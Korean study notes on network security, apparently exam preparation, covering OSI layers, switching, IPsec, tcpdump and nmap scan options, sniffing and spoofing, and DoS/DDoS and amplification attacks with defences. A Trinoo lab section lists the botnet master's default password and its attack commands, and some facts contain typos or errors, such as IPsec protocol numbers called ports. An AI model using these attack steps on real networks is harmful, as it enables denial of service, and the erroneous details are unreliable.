
### 브로드캐스트 주소 구하는 방법
* MAC은 ```FF:FF:FF:FF:FF:FF```
* IP는 예를 들어 161.134.4.0/22 의 브로드캐스트 주소를 구하면
  1) 서브넷 마스크 11111111 11111111 11111100 00000000 2진수를 구한다
  2) 호스트 주소 00000000 00000000 00000011 11111111 2진수를 구한다.
  3) 161.134.4.0 OR 호스트 주소를 한다.
  4) 161.134.7.255 가 브로드캐스트 주소이다.
 
### OSI 7계층 PDU (Protocol Data Unit)
1. 응용프로그램 계층
2. 표현 계층
3. 세션 계층        - 응용까지 데이터
4. 전송 계층        - 세그먼트
5. 네트워크 계층    - 패킷
6. 데이터 링크 계층 - 프레임
7. 물리 계층        - 비트

### 물리 계층 1계층
* 물리적 장치의 전기적, 전자적 연결에 대한 명세
* 장비 더미 허브, 리피터

### 허브 
* 한 포트에서 수신한 신호를 모든 포트로 전달할 뿐 트래픽을 조작하거나 검사하지 않는다.

### 데이터 링크 계층 2계층
* 데이터 링크 계층은 두 개의 서브 계층으로 구분한다. 하위 MAC(Media Access Control) 계층과 상위 LLC(Logical Link Control) 계층이 위치한다.
  * 하위 MAC 계층 : 장비 간 공유 매체에 대한 다중 접근 제어를 담당(CSMA/CD)
  * 하위 LLC 계층 : 장비 간 논리적 연결을 수립하고 제어하는 역할 담당(회선제어, 흐름제어, 오류제어 등)
* 단위는 프레임을 사용하고, 대표적인 장비로 스위치, 브릿지 등이 있으며 보안 프로토콜로 PPTP, L2F, L2TP 등이 있다.
* MAC 주소는 48bit, 6byte로 이루어지며, IP주소를 ARP 프로토콜을 사용하면 MAC 주소를 알 수 있다.
* **PPTP (Point to Point Tunnel Protocol)**
  * MS사에서 개발한 프로토콜
  * 하나의 터널에 하나의 연결만을 지원하여 일대일 통신만 가능하다.
* **L2F (Layer 2 Forwarding)**
  * 시스코사에서 개발한 프로토콜
  * 하나의 터널에 여러 개의 연결을 지원하여 다자간 통신이 가능하다.
* **L2TP (Layer 2 Tunneling Protocol)**
  * MS사와 시스코사에서 개발한 프로토콜
  * L2F에 기반을 두고 PPTP와의 호환성을 고려하여 만들어진 터널링 프로토콜   
* 스위치, 허브는 단일 Network 구간에서 사용된다.

### 스위치(L2-Switch)
* 필터링 기능 : 목적지 포트 외에는 프레임을 전송하지 않는다.
* 학습 기능 : 특정 포트로 유입된 프레임의 출발지 MAC 주소를 기반으로 MAC Address Table을 생성하여 포트별 연결된 장비의 MAC 주소를 식별한다.
* 플러딩 기능 : MAC Address Table에 등록되지 않은 목적지 MAC 주소의 프레임은 더미 허브와 동일하게 모든 포트로 프레임을 전송한다.
* 전달 기능 : 생성된 MAC Address Table을 참조하여 전송할 프레임의 MAC 주소의 포트로 프레임을 전달한다.
* 스위치 환경에서 스니핑 방법
  * **Switch Jamming / MAC Flooding** : Switch의 MAC Address Table을 모두 채워서 스위치가 허브처럼 동작하게 강제적으로 만들어 패킷을 스니핑 하는 기법. MAC Address Table을 채우기 위해 ARP Reply 패킷을 계속 전송한다.
  * **ARP Spoofing / ARP Cache Poisoning** : 공격자가 특정 호스트의 MAC 주소를 자신의 MAC 주소로 위조한 ARP Reply 패킷을 만들어 희생자에게 지속해서 전송하면 희생자의 ARP Cache table에 특정 호스트의 MAC 주소가 공격자의 MAC 주소로 변조된다. 이를 통해서 희생자로부터 특정 호스트로 나가는 패킷을 공격자가 스니핑하는 기법이다.
  * ARP Cache Table 을 보는 명령어는 ```apr -a``` 명령어로 확인가능하다.
  * **ARP Spoofing / ARP Cache Poisoning** 대응 방안 : ARP Cache Table 을 정적으로 설정한다. ```arp -s IP MAC```
  * **ARP Redirect** : 공격자가 자신이 라우터인 것처럼 MAC 주소를 위조한 ARP Reply 패킷을 해당 네트워크에 브로드캐스트하면 해당 네트워크에 연결된 모든 호스트의 ARP Cache table에 라우터의 MAC 주소가 공격자의 MAC 주소로 변조도니다. 이를 통해서 희생자로부터 외부 네트워크로 나가는 패킷을 공격자가 스니핑하는 기법이다.
  * **ICMP Redirect** : ICMP Redirect 메시지는 라우터에서 호스트 또는 라우터 간에 라우팅 경로를 재설정하기 위해 전송하는 메시지이다. 공격자는 이를 악용하여 특정 IP 또는 대역으로 나가는 라우팅 경로를 자기 주소로 위조한 ICMP Redirect 메시지를 생성하여 희생자에게 전송함으로써 희생자의 라우팅 테이블에 공격자로 향하는 경로를 생성한다. 이를 통해서 특정 IP 또는 대역으로 나가는 패킷을 공격자가 스니핑하는 기법이다.
  * **ICMP Redirect 대응 방안** : 호스트의 라우팅 테이블 정보가 ICMP Redirect 메시지에 의해 변경되지 않도록 호스트의 ICMP Redirect 옵션을 해제한다.
  * **Switch의 Span/Monitor Port를 이용** : 원래 Monitor Port란 스위치를 통과하는 모든 트래픽을 볼 수 있는 포트로 네트워크 관리 목적이지만 공격자가 트래픽들을 스니핑하는 좋은 장소를 제공한다.
* 한 포트에서 수신한 신호를 목적지 포트로만 전달한다. 확장 제한이 없으며, 이중화시 **스패닝 트리 프로토콜**을 이용하여 무한 루핑을 방지할 수 있다.
  1. Store-and-Forward 방식 : 수신된 전체 프레임을 버퍼에 저장하고 CRC 등의 오류 검사 수행 후 목적지 전송
  2. Fragment-Free 방식 : 수신된 프레임의 첫 64byte를 버퍼에 저장하고 충돌 등의 오류 검사 수행 후 목적지 전송
  3. Cut-Throuth 방식 : 수신된 프레임의 첫 6byte를 읽어 도착 MAC 주소를 검사 수행 후 목적지 전송
* 허브와의 차이점은 스위치는 MAC Address Table을 참조해 목적지 MAC 주소에만 전달하기 때문에 허브보다 상대적으로 스니핑에 안전하다.

### 포트 미러링
* 스위치 환경에서 모니터링과 트래픽 분석을 위해 특정 포트로 전달되는 패킷 또는 VLAN의 모든 패킷을 다른 모니터링 포트로 복제하여 전달

### 네트워크 계층 3계층
* 송신 측으로부터 수신 측까지 데이터를 안전하게 전달하기 위해 논리적 링크를 설정하고 상위 계층 데이터를 작은 크기의 패킷으로 분할하여 전송하는 역할
* 단위로 패킷을 사용하고, 경로 설정에 사용할 논리적 주소를 제공하며 대표적인 장비로는 라우터가 있고 대표적인 보안 프로토콜로 IPsec이 있다.
* **IPSEC**
  * 터널링 : 송신자와 수신자 사이의 전송로에 외부로부터의 침입을 막기 위한 일종의 파이프를 구성하는 기술
  * IKE : IPsec의 보안연관(SA) 생성을 위한 협상에 사용되는 키 교환 프로토콜로 500/udp 포트를 사용한다.
  * 전송모드 : 종단 호스트 사이에서 터널이 생성되는 것으로 IP 헤더를 제외한 부분에 대해서 보안 서비스를 제공하고 트래픽 흐름 분석에 취약할 수 있다. **보호 구간은 종단 노드구간**
  * 터널모드 : 터널 게이트웨이 사이에서 터널이 생성되는 것으로 IP 헤더를 포함한 패킷 전체에 대해서 보호 서비스를 제공한다. **보호 구간은 양쪽 터널 게이트구간 끝과 끝**
  * 보안 서비스 제공 6가지
    * 기밀성 : 대칭키 암호화를 사용하여 기밀성(AH는 X, ESP는 O)
    * 비연결형 무결성 : MAC을 이용하여 무결성 인증
    * 데이터 원천 인증 : 메시지 인증 코드(MAC)을 이용하여 송신자 보장
    * 재전송 공격 방지 : 패킷별 순서번호를 이용하여 재전송 공격 방지
    * 접근제어 : 보안 정책(SP)을 통해 중요 정보 및 시스템 접근 제한
    * 제한적 트래픽 흐름의 기밀성 : 터널모드가 적용된 ESP 는 전체 패킷을 암호화하여 기밀성 보장
  * **AH (Authentication Header)**
    * 메시지 인증 코드(MAC)를 이용하여 '비연결성 무결성'과 '데이터 원천 인증' 서비스를 제공하고, 기밀성 서비스 제공하지 않는다.
    * 순서번호를 통해 재전송 공격 방지한다.
    * 51번 포트를 사용한다.
    * **AH + 전송모드** : [ OriIP + AH_H + Payload , 변경가능한 헤더 제외 패킷 전체 인증 ] 
    * **AH + 터널모드** : [ NewIP + AH_H + OriIP + Payload , 변경 가능한 헤더 제외 패킷 전체 인증 ]
  * **ESP (Encapsulating Security Payload)**
    * 메시지 인증 코드(MAC)를 이용하여 '비연결성 무결성' 과 '데이터 원천 인증' 서비스를 제공하고, 대칭키 암호화를 통해 기밀성 서비스 제공한다.
    * 순서번호를 통해 재전송 공격 방지한다.
    * 50번 포트를 사용한다.
    * **ESP + 전송모드** : IP_H + [ ESH_H + Payload + ESH_T ] + ESP Auth (암호화는 전송모드는 payload + ESH_T 까지 암호화)
    * **ESP + 터널모드** : NewIP + [ ESH_H + OriIP + Payload + ESH_T ] + ESP Auth (암호화 터널모드는 OriIP + payload + ESH_T 까지 암호화)
### 라우터
* 가장 핵심적인 기능은 패킷의 경로를 결정하는 것과 결정된 경로에 따라 패킷을 전송하는 기능이다.
* VLAN 간에 통신을 가능하게 하고, 기본적인 보안 기능과 QoS 관련 기능 지원
* 인터페이스에 ```no ip unreachables``` 설정하는 이유는 전송할 수 없는 패킷이 들어와도 ICMP Unreachable 메시지 응답을 보내지 않는다.
* 보안관점에서 필요한 이유는 차단하지 않으면 악의적인 대량의 패킷을 통해 ICMP Unreachable 메시지 응답에 따른 라우터의 부하 유발, ICMP Unreachable 메시지 응답이 공격자의 포트스캐닝 공격 시 중요한 정보로 사용되기 때문이다.
### 전송 계층 4계층
* 종단 노드 간의 신뢰성 있는 데이터 전송을 담당한다.
* 단위로 세그먼트를 사방

### IGMP (Internet Group Management Protocol) 프로토콜
* 멀티캐스트를 지원하는 라우터가 멀티캐스트 그룹에 가입한 네트워크 내의 호스트를 관리하기 위해 사용하는 프로토콜이다.
* IGMP는 ICMP와 마찬가지로 IP 상위 계층에 존재하며 IP 패킷으로 캡슐화되어 전송된다.

### IP 단편화 
* ```flag id:size@offset[+] 단편ID:IP 헤더를 제외한 단편 크기(byte)@단편의 상대위치이고 추가 단편이 있음(+)을 의미한다.```
* 예를 들어 MTU가 1500바이트로 설정된 Ethernet을 통해 4,000 바이트의 ping 패킷을 보내려고 한다. 실제 크기는 20byte를 뺀 1480 바이트가 크기가 된다.

### IPv6
* **듀얼스택** : IPv4와 IPv6 프로토콜을 동시에 설정하여 통신 상태에 따라 선택적으로 사용할 수 있도록 하는 방식
* **터널링** : IPv4 네트워크를 경유하여 IPv6 네트워크 간 통신을 위한 방식으로 IPv4 네트워크를 통과하는 가상의 경로(터널)를 만들어 통신하는 방식
* **주소/헤더 변환** : 변환 헤더를 추가하여 IPv4 -> IPv6, IPv6 -> IPv4

### 소켓
* 호스트/프로세스 간에 통신을 위한 소프트웨어 모듈을 의미한다.
* 특정 IP 주소와 포트 번호의 조합으로서 같은 IP의 동일한 시스템이 동시에 특정 클라이언트의 복수 개의 응용 프로그램에 정확하게 통신할 수 있게 해준다.

### 포트
* 상위 애플리케이션/서비스/소켓을 식별하기 위한 식별자로 IANA 기구를 통해 관리되고 있다.
  1. well-known port(0~1023)
     |프로토콜|포트번호|설명|
     |:-:|:-:|:-|
     |FTP, Data|20|파일 전송 프로토콜의 데이터채널|
     |FTP, Control|21|파일 전송 프로토콜의 제어채널|
     |TELNET|23|터미널 네트워크|
     |SMTP|25|간단한 메일 전송 프로토콜|
     |DNS|53|도메인 네임 시스템|
     |BOOTP|67|부트스트랩 프로토콜|
     |HTTP|80|하이퍼텍스트 전송 프로토콜|
  2. Regstered Port(1024~49151)
      * 제조사가 IANA에 용도를 등록해서 사용하는 포트로 일반 사용자가 서버 프로세스를 실행하기 위해 사용하는 포트이다.
  3. Dynamic Port(49152~65535)
      * 서버/클라이언트 환경에서 클라이언트 접속 시 사용하는 임시 포트

### 세션 하이재킹
* 공격자가 인증이 완료된 정상적인 사용자 세션을 중간에 가로채서 별도의 인증작업 없이 정상적인 사용자로 위장하여 가로챈 세션으로 통신하는 행위이다.
  * **TCP 세션 하이재킹** : TCP의 세션 관리 정보(출발지 IP/Port, Sequence Number 등)를 위조하여 TCP 세션을 가로채는 행위
    * TCP 세션 하이재킹은 케빈 미트닉이 시모무라 쓰토무의 컴퓨터 시스템을 공격할 때 사용했던 공격 방식으로 TCP 사용자 정보(IP/Port, Sequence Number)로 위조하여 IP 스푸핑으로 세션 취 
  * **HTTP 세션 하이재킹** : 사용자의 HTTP 세션 ID를 탈취하여 정상 사용자로 위장하여 서버에 접근하는 공격

### netbios (Network Basic Input/Output System) 
* IBM PC를 위한 네트워크 인터페이스 체계로 네임, 세션, 데이터그램의 세 가지 서비스를 제공하고 있다.
* 차단하려면 tcp/udp 135~139 포트 차단

### SMB (Server Message Block)
* 윈도우 운영체제 환경에서 사용되는 파일, 프린터, 직렬 포트 등에 대한 공유 프로토콜로 유닉스/리눅스 운영체제에서는 삼바 소프트웨어를 설치하면 SMB를 이용한 유닉스/리눅스와 윈도우 컴퓨터 간 공유가 가능하다.
* 초기 SMB는 NetBios API에서 동작했으며 TCP 139번 포트를 사용
* 윈도우 2000 이후 SMB 기능을 확장하여 **CIFS(Common Internt FIle System)라는 이름으로 변경, TCP 445번 포트 사용
* 여러 보안 취약점으로 인해 컨피커 웜 바이러스, 워너크라이 랜섬웨어, 워너마인 암호화폐 채굴 악성코드 등에 악용
* tcp 445 포트 차단

### PING
* ICMP Echo Request 메시지를 특정 호스트에 송신하여, 이에 대한 ICMP Echo reply를 수신함으로써 호스트의 활성화 여부를 검사하고 요청과 응답에 대한 경과 시간 RTT(Round Trip Time)를 알아볼 때 사용한다.

### netstat
* 시스템의 네트워크 관련 다양한 상태정보를 확인할 수 있는 유닉스/리눅스/윈도우 시스템의 내장 명령어이다. 네트워크 인터페이스에 대한 정보, 라우팅 테이블 정보, 소켓 상태정보, 프로토콜별 통계 정보 등 지정 옵션에 따라서 다양한 네트워크 관려 정보 제공
* 현재 시스템과 통신하고 있는 네트워크 상태 출력
* -a : 모든 상태의 소켓 정보 출력
* -n : 네트워크 주소(IP, Port)를 숫자 형식으로 출력
* -t 또는 -u : TCP, UDP 소켓 정보만 출력
* -p : 해당 소켓의 PID/프로세스명 정보 출력
* -o : 연결의 소유자 프로세스 ID 출력
* -r : 라우팅 정보 출력
* -i : 네트워크 인터페이스 정보 출력
* -s : 네트워크 프로토콜에 대한 통계 출력

### tcpdump
* 네트워크 인터페이스를 거치는 패킷을 캡처해주는 도구이다. 일반적으로 패킷 캡처용 도구를 패킷 스니퍼라고 한다.
* 자신의 컴퓨터로 들어오는 모든 패킷의 내용을 도청할 수 있으며, 공격자를 추적 및 공격 유형 분석을 위한 패킷 분석 시에 활용할 수 있는 도구이다.
* tcpdump는 유닉스 계열에서 설치, 활용이 가능하며 윈도우 용으로는 windump가 있으며 활용 방법은 유사하다.
* tcpdump 옵션 [BPF]
  * -i : 인터페이스 정보 명시 ex) -i eth0
  * -nn : 출력 시 reverse lookup 수행하지 않는다. 즉, 출력 시 호스트명과 서비스명으로 변환하지 않고 IP와 Port 번호 형식으로 출력하라는 의미이다.
  * -v, -vv, -vvv : 패킷 헤더부까지 상세하게 출력한다.
  * -X, -XX : 패킷의 헤더부 출력과 함께 패킷데이터를 HEX-ASCII 포맷으로 출력한다.
  * -w : 출력할 파일명. 일반적으로 pcap 확장자 사용
  * -r : 읽어올 파일명
  * BPF는 Berkely Packet Filter를 말한다. 이는 대부분의 패킷 스니퍼 프로그램에서 지원하는 방식으로 원하는 패킷만을 스니핑하기 위한 룰을 지정하는 부분이다.
  * BPF 사용 예제
    * ```tcpdump -i eth1 -nn "tcp port 80"```
      * 80번 포트를 출바지 또는 목적지로 하는 tcp 패킷을 캡처한다.
      * 방향성을 지정하려면 src port, dst port와 같이 설정한다.
    * ```tcpdump -i eth1 -nn "tcp and host 192.168.197.1"```
      * 192.168.197.1 주소를 출발지 또는 목적지로 하는 tcp 패킷을 캡처한다. 
      * 방향성을 지정하려면 src host, dst host와 같이 설정한다.
    * ```tcpdump -i eth1 -nn "tcp and net 192.168.197.0 mask 255.255.255.0"```
      * 192.168.7.0/24 대역의 모든 패킷을 캡쳐한다. net 192.168.197.0/24와 같이 CIDR 표기법으로 명시해도 된다.
    * ```tcpdump -i eth1 -nn "tcp port 80 and host 192.168.197.1"```
      * 출발지 또는 목적지 주소가 192.168.197.1이고, 출발지 또는 목적지 포트가 80인 tcp 패킷을 캡처한다.
      * 논리연산을 위해 and, or, and not 등을 지원한다.
    * ```tcpdump -i eth0 -nn "tcp port 80 and not host 192.168.197.1"```
      * 출발지 또는 목적지 포트가 80이고 출발지 또는 목적지 주소가 192.168.197.1 이 아닌 패킷을 캡처한다.

      
        

### tracerout
* 종단 노드 사이에 있는 여러 중계 노드(L3장비/라우터) 각 구간에 대한 네트워크 상태를 관리하기 위한 명령어로 최종 목적지 노드에 도달하는데 경유하는 중계 노드(라우터)의 개수, IP 주소, 응답시간 등을 파악할 수 있다.
* 최초 IP 패킷의 TTL 필드값이 1인 UDP 패킷은 첫 번째 라우터에서 TTL이 감소하여 0으로 되고 해당 패킷이 폐기되었음을 알리는 ICMP Time Exceeded 메시지가 최초 출발지로 전송된다. 두 번째 TTL 필드값이 2인 .....

### 포트 스캐닝
* 공격자가 침입 전 대상 시스템에 어떤 포트(서비스)가 열려있는지 확인하는 작업으로 대상 서버의 동작 여부와 제공하는 서비스 등을 확인할 수 있다.
* TCP Half SCAN이 응답이 없으면 필터링되거나 방화벽으로 차단되는 것으로 판단한다.
* SYN Connect 스캔 (nmap -sT) : SYN 보냄. 포트가 닫혔을 때 RST/ACK 응답, 포트가 열린 경우 SYN/ACK 응답
* Decoy Scan(유인 스캔) : 스캔을 당하는 타겟 호스트에서 스캐너 주소를 식별하기 어렵게 하려고 실제 스캐너 주소 외에도 다양한 위조된 주소로 스캐하는 방식
* FIN SCAN (nmap -sF) : FIN 보냄. 포트가 열을 때 응답 X, 포트가 닫힌 경우 RST/ACK 응답
* XMAS SCAN (nmap -sX) : FIN, PSH, URG 보냄. 포트가 열렸을 때 응답 X, 포트가 닫힌 경우 RST/ACK 응답
* NULL SCAN (nmap -sN) : NULL 보냄. 포트가 열렸을 떄 응답 X, 포트가 닫힌 경우 RST/ACK 응답
* TCP Half SCAN (nmap -sS) : SYN 보냄. 포트가 열렸을 떄 SYN/ACK 패킷이 오면 수신하고 즉시 RST 패킷 보내어 연결 종료, 포트가 닫힌 경우 RST/ACK 응답
* TCP ACK SCAN (nmap -sA) : ACK 보냄. 방화벽 필터링 정책을 테스트하기 위한 스캔이다. RST 응답이 오면 방화벽 정책에 의해 허용되고, 응답이 없으면 방화벽 정책에 의해 차단되고 있는 것으로 판단한다.
* PING SCAN (nmap -sP) : ping 스캔(imcp, icmp echo 스캔)
* OS SCAN (nmap -O) : 대상 호스트의 운영체제 정보 출력
* (nmap -p) : 대상 호스트의 포트 지정
* (nmap -b hostname) : 호스트에 대한 FTP 바운스 스캔을 할 수 있다.

### 스니핑
* 랜카드를 무차별 모드(Promiscuous Mode)로 설정한 후 연결된 회신에 흐르는 모든 IP 패킷을 가로채는 공격을 말한다.
* 대표적으로 **스위치 재밍**, **SPAN 포트 태핑 등이 있다.

### 스푸핑
* 포트 주소, IP 주소, MAC 주소 등을 조작하여 네트워크 트래픽 흐름을 왜곡하고 시스템 권한 탈취 등의 행위를 수행하는 공격을 말한다.
* **ARP Spoofing**, **IP Spoofing**, **DNS SPoofing** 공격이 있다.

### 스누핑 
* 네트워크 트래픽상의 정보를 획득하는 공격 행위를 말한다.

### 도스/디도스
* 네트워크 대역을 고갈시키는 등의 공격을 말한다. 대표적으로 TCP SYN Flooding, HTTP Flooding, HTTP CC 등의 공격기법이 있다. 해당 공격이 발생하면 공격 대상 사이트의 서비스 가용성에 심각한 영향을 미친다.

### LAND Attack
* 출발지 IP와 목적지 IP가 동일한 공격이다.

### Fragment Overlap
* 공격자는 공격용 IP 패킷을 위해 두 개의 단편(Fragment)을 생성한다. 첫 번째 단편에서는 패킷 필터링 장비에서 허용하는 HTTP와 같은 포트 번호를 설정한다. 그리고 두 번째 포트 단편에서는 offset을 조작해서 재조합될 때 첫 번째 단편의 일부분을 덮어쓰여 공격자가 원하는 포트로 연결이 된다.

### Tiny Fragment
* 패킷 필터링 장비나 IDS는 필터링을 결정하기 위해 포트 번호를 확인하는데, 포트 번호가 포함되지 않을 정도로 아주 작게(Tiny) 쪼개진 첫 번째 단편을 그냥 통과시킨다. 실제 포트 번호가 포함된 두 번째 단편은 첫 번째 단편이 허용되었으므로 통과하여 공격자가 원하는 포트로 연결이 된다.

### Teardrop
* 공격자가 헤더가 조작된 일련의 IP 패킷 조각들을 전송함으로써 패킷을 재조합하는 과정에서 부하가 걸리게 하는 공격 방법이다.

### Ping Of Death
* 아주 크게 만든 ICMP 패킷을 전송함으로써 공격 네트워크에 도달하는 동안 아주 작은 조각이 되어 공격 대상 시스템이 조각화된 패킷을 모두 처리해야 함으로써 성능을 떨어뜨리는 공격이다.

### Smurf 
* 출발지 IP 주소를 공격대상의 IP 주소로 위조한 ICMP Echo Request 를 브로드캐스트하여 다수의 ICMP Echo Reply 패킷을 공격대상에게 전달되어 서비스 거부 상태 유발 공격
* **대응방법** : 자신의 네트워크로 들어오는 Directed Broadcast 패킷을 막도록 라우터 설정, IP Broadcast Address로 온 ICMP Request 패킷 응답 X

### DRDoS 공격
* 공격자가 출발지 IP를 공격 대상 IP로 위조하여 다수의 반사 서버(Reflector)로 요청정보를 전송하면 공격 대상은 반사 서버로부터 대량의 응답을 받아 서비스 거부 상태가 되는 공격 형태이다.

## DDoS 공격
* Attack : C&C 서버에 공격 명령을 실행하는 공격자 컴퓨터
* Target : 공격 대상 되는 피해 시스템
* C&C 서버(Master) : 공격자로부터 직접 공격 명령을 전달받는 시스템을 말하며 전달받은 명령은 관리하는 다수의 좀비 PC/Device에 전달
* 좀비 PC/Device(Slave) : C&C 서버로부터 전달받은 명려을 실행하여 공격 대상에 실제 공격을 수행하는 시템
### 트리누 (Trinoo)
* 미네소타 대학, 솔라리스 2.x에서 최초 발견
* UDP Flooding DDoS 공격을 유발하는 데 사용되었으며 Attacker, Master, Zombie로 공격 네트워크를 구성
* rpc.statd, rpc.cmds, rpc.ttdserverd 데몬의 취약점을 이용
* 접속 포트
  * Attack -> Master : 27665/tcp
  * Master -> Zombie : 27444/udp
  * Zombie -> Master : 31335/udp
  * Zombie -> Victim : udp 공격
#### Trino 공격 실습
* Master 데몬을 통한 공격
  1. telnet을 통한 Master 데몬 접속(27665/udp)
     * 원격 접속 시 패스워드 사용(password : betaalmostdone)
  2. bcast 명령 : Zombie PC 리스트 확인
  3. doc 공격 대상 IP 명령 : 공격 대상 IP로 공격 개시(192.168.8.11)
     * dos 192.168.8.11
  4. mdie killme : 공격 중지
   
### TFN (Tribe Flood Network)
* Trinoo처럼 rpc.statd, rpc.cmds, rpc.ttdserverd 데몬의 취약점을 이용
* Attacker가 Master에 명령 시 패스워드를 쓰지 않고 ICMP echo request 패킷에 명령어를 전송
* TCP, UDP, ICMP 등을 복합적으로 사용하여 TCP Syn Flooding, UDP Flooding, ICMP Flooding, Smurf 공격 수행

### Stacheldracht
* Trinoo와 TFN의 발전된 형태로 TCP Syn Flooding, UDP Flooding, ICMP Flooding, Smurf 공격 등을 수행
* Master에 새로운 Agent가 자동으로 갱신되는 특징이 있다.
* 접속 포트
  * Attack -> Master : 16660/tcp
  * Master -> Zombie : 65000/tcp
  * Zombie -> Master : ICMP Echo Reply
  * Zombie -> Victim : TCP Syn, UDP Flooding, ICMP Flooding, Smurf

### TFN2K
* TFN의 발전된 형태로 통신에 특정 포트가 사용되지 않고 암호화되어 있음
* TCP, UDP, ICMP 등을 복합적으로 사용하여 TCP Syn Flooding, UDP Flooding, ICMP Flooding, Smurf 공격 등을 수행
* UDP 패킷의 헤더는 정상적인 UDP 패킷보다 3byte 크고 TCP 패킷의 헤더 길이는 항상 0이다.

### P2P 봇넷
* 분산형 명령/제어 방식
* 참여 멤버(좀비/봇) 모두 C&C 역할을 하므로 별도의 도메인과 C&C 서버가 불필요하다.
* 대표적인 봇넷으로 Strom, Peacomm 등이 있다.

### DGA (Domain Generation Algorithm) 기법
* 새로운 C&C서버 도메인을 동적으로 다수 생성해 C&C 서버가 노출되는 것을 숨기는 기법으로 도메인 기반으로 탐지하는 보안장비를 우회하기 위한 목적
* 약속된 규칙 도메인명을 생성하기 때문에 C&C 서버를 운영하는 공격자는 해당 규칙에 따라 생성될 수 있는 도메인명 중 하나를 DNS 서버에 새롭게 등록하는 방식으로 운영

### HTTP Get Flooding
* 공격자가 동일한 동적 컨텐츠(/index.php)에 대한 HTTP GET 요청을 대량으로 발생시켜 공격 대상 웹서버가 해당 요청을 처리하기 위해 서버 자원을 과도하게 사용하도록 하여 정상적인 요청을 처리하지 못하도록 하는 서비스 거부 공격이다.

### Slow HTTP Header Dos 
* HTTP 프로토콜을 이용한 서비스 거부 공격으로 정상적인 HTTP 패킷의 헤더는 Carriage Return & Line Feed(개행문자)가 두 번 나타나지만, 해당 공격이 발생하면 헤더의 마지막에 개행문자를 하나만 전송하여 웹서버와의 다수 연결 상태를 장시간 지속시킴으로써 웹서버의 자원을 잠식하게 되는 공격
* 임계치를 설정하여 동일한 출발지 IP에서 동시 연결 개수 제한
* 클라와 웹서버 간 세션에 대한 연결 타임아웃을 설정한다.

### Slow HTTP POST DoS(RUDY)
* 다수의 HTTP POST 요청 시 Content-Length 헤더를 매우 크게 설정한 후 매우 작은 데이터를 천천히 지속해서 전송함으로써 웹서버와의 연결을 장시간 지속시켜 연결 자원을 모두 소진시키는 DoS 공격을 말한다.
* 임계치를 설정하여 동일한 출발지 IP에서 동시 연결 개수 제한
* 클라와 웹서버 간 세션에 대한 연결 타임아웃을 설정한다.

### Slow HTTP Read DoS
* 다수의 HTTP 요청에 대한 서버 응답에 대해 조작된 'TCP Zero Window 패킷'을 천천히 지속해서 전송하여 HTTP 응답 데이터 수신을 지연시킴으로써 웹서버와의 연결을 장시간 지속시켜 연결자원을 모두 소진시키는 형태의 DOS 공격을 말한다.
* 임계치를 설정하여 동일한 출발지 IP에서 동시 연결 개수 제한
* 클라와 웹서버 간 세션에 대한 연결 타임아웃을 설정한다.

### TCP SYN Flooding
* 정상적인 TCP 연결이라면 클라이언트로부터 SYN+ACK에 대한 ACK 응답을 받아 연결 설정이 완료되지만 'TCP SYN Flooding 공격'의 경우 공격자가 출발지 IP를 위조하여 다수의 요청을 발생시키고 위조된 출발지 주소이기 떄문에 SYN+ACK에 대한 정상 ACK 응답이 발생하지 않는다.
* 공격 대상 서버의 제한된 **Backlog Queue(연결요청대기큐)** 를 모두 소진시키는 형태의 공격이다.
* 따라서 netstat -an 명령을 수행하여 서버 측에서 다수의 SYN_RECV의 연결 설정 중인 소켓을 확인할 수 있다.
* TCP SYN Flooding 대응방안
  1. Backlog Queue(연결요청대기큐) 의 크기를 늘린다.
  2. 보안장비를 이용해 임계치 기반의 차단을 수행한다.
  3. TCP SYN Cookie 설정한다. -> ```sysctl -w net.ipv4.tcp_syncookies=1```

### ngrep 
* tcpdump/wirewhark 와 같이 패킷을 캡처하고 분석할 수 있는 도구이다. 일반적으로 Ascii 형식으로 패킷의 데이터를 보고자 할 때 유용하게 사용할 수 있다.
* -I : pcap 파일을 read
* -t : 타임스탬프를 출력
* -W byline : 패킷을 라인 단위로 출력한다.

### DNS 증폭 공격
* 악용하는 질의 방식으로 DNS Record 질의 타입을 ANY, TXT로 지정하면 요청한 도메인에 대한 모든 레코드 타입의 응답이 반환되기 때문에 응답이 증폭되는 효과가 있다.
* tcpdump 패킷을 보면 ID+ 형태는 질의 ID* 형태는 응답을 의미한다.
* 내부 사용자용 DNS 서버라면 내부 사용자 주소만 Recursive Query가 가능하도록 제한한다.
* 보안장비를 사용하여 특정 Byte 이상의 DNS 응답을 차단하거나 동일 출발지 IP에 대해 단위 시간당 요청개수 임계치 설정
* 이 기법을 사용하는 이유는 반사 공격이라 공격자를 찾기 쉽지 않고, 큰 크기를 보내 트래픽 효율성이 좋다.

### 멤캐시드 (Memcached)
* 오픈소스 메모리 캐싱 시스템(메모리를 사용해 캐시 서비스를 제공해주는 데몬)으로 11211/tcp 와 11211/udp 포트를 기본 포트로 사용한다.
* 별도의 인증과정 없이 접근을 허용해주기 때문에 공격자가 멤캐시드 서버 IP 주소의 기본 포트인 11211번 포트로 희생자의 IP 주소로 위조한 특정 명령(state, set/get 명령 등)의 UDP 패킷을 전송하면 멤캐시드 서버가 희생자 IP로 패킷보다 증폭된 패킷을 반사하게 된다.

### WSD (또는 WS-Discovery)
* 웹 서비스 디스커버리의 준말로 자동으로 장비를 검색해주는 기술이다.
* UDP 3702번 포트를 기반으로 한 멀티캐스트 통신을 사용한다.
* 윈도우 기반 기기들이 네트워크 프린터 등을 자동으로 찾아서 연결 설정을 완료하는데 사용되는 서비스로 내부 네트워크망에서 사용되지만, 인터넷망에 노출되면 디도스 공격으로 악용될 수 있다.
* **WSD 증폭/반사** 공격은 요청 시 악의적으로 XML 오류 응답 메시지를 반복적으로 유발하는 명령을 요청하고 위조된 피해자의 IP로 대규모의 증폭된 응답이 가게 만드는 공격기법이다.

### ARMS (Apple Remote Management Service)
* 애플 기기들의 원격제어 기능을 활성화할 때 사용되는 데스크톱 원격제어 프로토콜이다.
* TCP/UDP 3283번 포트를 사용한다.
* **ARMS 증폭/반사** 공격은 피해자 IP로 출발지 IP를 위조한 후 취약한 애플 MAC 컴퓨터를 대상으로 원격 접속 요청을 보내 증폭된 응답이 가게 만드는 공격기법이다.

### CoAP (Constrained Application Protocol)
* 불안정한 네트워크상의 저전력 IoT 기기들을 위한 일종의 애플리케이션 프로토콜로 주로 중국의 모바일 폰과 사물인터넷 장비들 사이에서 사용된다.
* uDP 5683번 포트를 사용한다.
* 피해자 IP로 스푸핑한 출발지 IP에서 외부 노출된 IoT 기기 및 모바일 장치들을 대상으로 변조된 Get Request를 보내 증폭된 응답이 가게 만드는 공격기법이다.

### WEP (Wired Equivalent Privacy)
